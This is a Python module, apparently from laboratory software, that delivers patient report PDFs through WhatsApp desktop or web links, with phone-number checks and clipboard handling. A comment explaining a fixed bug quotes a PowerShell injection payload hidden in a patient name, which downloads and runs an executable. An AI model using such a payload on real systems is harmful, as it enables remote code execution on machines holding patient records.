"""Getting the finished PDF to the customer.

Everything sits behind the Sender interface. Today there is one implementation,
which opens WhatsApp with the number and message ready and leaves the final
keypress to the operator. Windows cannot make another application attach a file
without UI automation that breaks whenever WhatsApp updates, so the last step
stays manual on purpose: it is reliable, needs no Meta business account, no
per-message fee and no template approval, and it sends from the lab's own
number.

Adding WhatsAppCloudApiSender later means writing one class here and changing
one setting. Nothing else in the program refers to WhatsApp.
"""

from __future__ import annotations

import os
import platform
import re
import subprocess
import urllib.parse
import webbrowser
from dataclasses import dataclass
from pathlib import Path
from typing import List, Optional, Protocol


class SendError(RuntimeError):
    """Carries a message written for the operator."""


@dataclass
class SendResult:
    ok: bool
    channel: str = ""
    detail: str = ""
    manual_step: str = ""


class Sender(Protocol):
    name: str

    def send(self, pdf: Path, phone: str, message: str) -> SendResult: ...


# ---------------------------------------------------------------- phone numbers

_DIGITS = re.compile(r"\D+")


def normalise_phone(phone: str, country_code: str = "91") -> Optional[str]:
    """Return digits with a country code, or None if it cannot be a number.

    Indian mobiles are ten digits; anything shorter is a typo or a landline
    fragment and must not be dialled, because sending a patient's report to the
    wrong number is the worst thing this program could do.
    """
    digits = _DIGITS.sub("", phone or "")
    if not digits:
        return None
    cc = _DIGITS.sub("", country_code or "91") or "91"

    if digits.startswith("00"):
        digits = digits[2:]
    if len(digits) == 10:
        return cc + digits
    if len(digits) == 11 and digits.startswith("0"):
        return cc + digits[1:]
    if len(digits) == 12 and digits.startswith(cc):
        return digits
    if 11 <= len(digits) <= 15:
        return digits
    return None


def format_message(template: str, **fields) -> str:
    """Fill the saved template. An unknown placeholder is left visible rather
    than raising, so a mistyped template never blocks a send."""
    out = template or ""
    for key, value in fields.items():
        out = out.replace("{" + key + "}", "" if value is None else str(value))
    return out


# ------------------------------------------------------------------ clipboard

def copy_file_to_clipboard(path: Path) -> bool:
    """Put the PDF on the clipboard so one Ctrl+V attaches it in WhatsApp."""
    p = Path(path)
    if not p.exists():
        return False

    if platform.system() == "Windows":
        # Set-Clipboard -Path puts a real file object on the clipboard, which is
        # what WhatsApp accepts as an attachment. Copying the text of the path
        # would only paste the path as a message.
        #
        # The path is passed as an ARGUMENT, never built into the script text.
        # It used to be interpolated: f'Set-Clipboard -LiteralPath "{p}"'. The
        # path contains the patient's folder name, PowerShell expands $(...)
        # inside a double-quoted string, and the folder-name filter strips only
        # the characters Windows forbids -- so a patient registered as
        #     Anil $(Invoke-WebRequest http://.../x.exe -OutFile y.exe; ./y)
        # ran that command on the laboratory PC the first time anyone pressed
        # Send for them. $args[0] is data; PowerShell never parses it.
        try:
            subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command",
                 "Set-Clipboard -LiteralPath $args[0]", "-args", str(p)],
                check=True, capture_output=True, timeout=15,
                creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
            )
            return True
        except (subprocess.SubprocessError, OSError):
            return False

    # Elsewhere (development machines) fall back to copying the path as text.
    try:
        from PyQt6.QtGui import QGuiApplication

        cb = QGuiApplication.clipboard()
        if cb is not None:
            cb.setText(str(p))
            return True
    except Exception:
        pass
    return False


def open_folder(path: Path) -> None:
    """Show the file in Explorer, for when a manual attach is easier."""
    p = Path(path)
    try:
        if platform.system() == "Windows":
            # One argument, no space after the comma. Explorer ignores
            # "/select," and the path as separate arguments and just opens
            # Documents instead of highlighting the report.
            subprocess.Popen(f'explorer /select,"{p}"')
        elif platform.system() == "Darwin":
            subprocess.Popen(["open", "-R", str(p)])
        else:
            subprocess.Popen(["xdg-open", str(p.parent)])
    except OSError:
        pass


# ------------------------------------------------------------------- senders

def desktop_app_available() -> bool:
    """Is the WhatsApp desktop app registered to handle whatsapp:// links?

    Checked properly rather than assumed: launching the scheme when nothing
    handles it fails in a way that looks identical to success.
    """
    if platform.system() != "Windows":
        return False
    try:
        import winreg

        with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, "whatsapp") as key:
            winreg.QueryValueEx(key, "URL Protocol")
        return True
    except (ImportError, OSError):
        return False


def open_url(url: str) -> bool:
    """Hand a URL to the operating system.

    On Windows this uses os.startfile, NOT `cmd /c start`. In cmd, `&` separates
    commands, so `whatsapp://send?phone=91...&text=Dear` is cut in half at the
    `&` and the message never arrives -- and cmd still reports success, so the
    failure is invisible.
    """
    if platform.system() == "Windows":
        try:
            os.startfile(url)               # type: ignore[attr-defined]
            return True
        except (OSError, AttributeError, ValueError):
            return False
    try:
        return bool(webbrowser.open(url))
    except Exception:
        return False


def desktop_url(number: str, text: str) -> str:
    return f"whatsapp://send?phone={number}&text={text}"


def web_url(number: str, text: str) -> str:
    # web.whatsapp.com/send opens the chat directly. wa.me shows a
    # "Continue to Chat" landing page first, which is an extra click every time.
    return f"https://web.whatsapp.com/send?phone={number}&text={text}"


class WhatsAppDesktopSender:
    """Opens WhatsApp on the right chat with the message already typed.

    Tries the desktop app when it is actually installed, and falls back to
    WhatsApp Web otherwise. mode: 'auto', 'desktop' or 'web'.
    """

    name = "whatsapp"

    def __init__(self, country_code: str = "91", mode: str = "auto"):
        self.country_code = country_code
        self.mode = (mode or "auto").strip().lower()

    def send(self, pdf: Path, phone: str, message: str) -> SendResult:
        number = normalise_phone(phone, self.country_code)
        if not number:
            raise SendError(
                "That phone number does not look complete, so nothing was sent. "
                "Check the number on the patient's record and try again."
            )

        copied = copy_file_to_clipboard(pdf)
        text = urllib.parse.quote(message or "", safe="")
        tried: List[str] = []

        # Three modes, and the difference between them matters:
        #
        #   desktop  the application only. A report cannot be attached to
        #            WhatsApp Web -- the paste lands in a browser tab, where
        #            LabSoft has no way to put a file -- so falling back to
        #            the browser would send a message with no report on it
        #            and still report success. This is the default.
        #   auto     the application if it is there, the browser if not.
        #   web      the browser, message only.
        if self.mode == "desktop":
            if not desktop_app_available():
                raise SendError(
                    "The WhatsApp application is not installed on this PC, so "
                    "the report cannot be attached.\n\n"
                    "Install WhatsApp for Windows from whatsapp.com and sign "
                    "in once. LabSoft will then open it on the right chat "
                    "with the report ready to attach.\n\n"
                    "Until then, choose “The browser only” under Settings › "
                    "WhatsApp to send the message without the report.\n\n"
                    f"The report is saved and ready at:\n{pdf}")
            if open_url(desktop_url(number, text)):
                return self._result("whatsapp", number, copied,
                                    "WhatsApp Desktop")
            tried.append("the WhatsApp desktop app")

        elif self.mode == "auto":
            if desktop_app_available() and open_url(desktop_url(number, text)):
                return self._result("whatsapp", number, copied,
                                    "WhatsApp Desktop")
            tried.append("the WhatsApp desktop app")
            if open_url(web_url(number, text)):
                return self._result("whatsapp_web", number, copied,
                                    "WhatsApp Web in your browser")
            tried.append("WhatsApp Web")

        else:
            if open_url(web_url(number, text)):
                return self._result("whatsapp_web", number, copied,
                                    "WhatsApp Web in your browser")
            tried.append("WhatsApp Web")

        raise SendError(
            "WhatsApp could not be opened on this computer.\n\n"
            + (f"Tried: {', '.join(tried)}.\n\n" if tried else "")
            + f"The report is saved and ready at:\n{pdf}\n\n"
            "Use 'Open folder' below and attach it in WhatsApp yourself."
        )

    def _result(self, channel: str, number: str, copied: bool,
                where: str) -> SendResult:
        if copied and channel == "whatsapp_web":
            step = (f"{where} is opening for {number}.\n"
                    "A browser cannot take the report from LabSoft — attach it "
                    "yourself with 'Open folder'.")
        elif copied:
            step = (f"{where} is opening for {number}.\n"
                    "When the chat appears, press Ctrl+V then Enter to attach "
                    "the report.")
        else:
            step = (f"{where} is opening for {number}.\n"
                    "The report could not be put on the clipboard — use "
                    "'Open folder' and attach it yourself.")
        return SendResult(ok=True, channel=channel, detail=number, manual_step=step)


class SaveOnlySender:
    """No sending; the PDF simply stays on disk."""

    name = "saved"

    def send(self, pdf: Path, phone: str, message: str) -> SendResult:
        return SendResult(ok=True, channel="saved", detail=str(pdf),
                          manual_step=f"Saved to {pdf}")


def open_chat(phone: str, message: str = "", country_code: str = "91",
              mode: str = "auto") -> SendResult:
    """Open a WhatsApp chat without touching the clipboard or attaching anything.

    Used by the Settings check. It must never put a file on the clipboard: an
    earlier version passed the database path here, which copied every patient
    record in the lab onto the clipboard ready to be pasted into a chat.
    """
    number = normalise_phone(phone, country_code)
    if not number:
        raise SendError("That number is not complete enough to open a chat.")

    text = urllib.parse.quote(message or "", safe="")
    mode = (mode or "auto").strip().lower()

    if mode in ("auto", "desktop") and (mode == "desktop" or desktop_app_available()):
        if open_url(desktop_url(number, text)):
            return SendResult(ok=True, channel="whatsapp", detail=number,
                              manual_step="WhatsApp Desktop opened.")
    if mode != "desktop" and open_url(web_url(number, text)):
        return SendResult(ok=True, channel="whatsapp_web", detail=number,
                          manual_step="WhatsApp Web opened in your browser.")

    raise SendError("WhatsApp could not be opened on this computer.")


def get_sender(kind: str = "whatsapp", country_code: str = "91",
               mode: str = "auto") -> Sender:
    if kind == "saved":
        return SaveOnlySender()
    return WhatsAppDesktopSender(country_code, mode)
